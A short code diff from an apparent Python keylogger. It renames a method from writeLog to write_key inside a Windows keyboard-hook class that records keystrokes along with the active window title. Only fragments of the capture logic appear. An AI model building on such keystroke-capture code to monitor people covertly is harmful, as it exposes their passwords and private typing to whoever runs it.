@@ -402,7 +402,7 @@ class Key(threading.Thread):
 
         self.window_title = ''
 
-    def writeLog(self, log):
+    def write_key(self, log):
         current_window_title = get_window_title()
         if current_window_title != self.window_title:
             print current_window_title
@@ -432,7 +432,7 @@ class Key(threading.Thread):
                         l_param[0]).upper()
                 else:
                     key = update_key(l_param[0]).lower()
-        self.writeLog(key)
+        self.write_key(key)
 
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
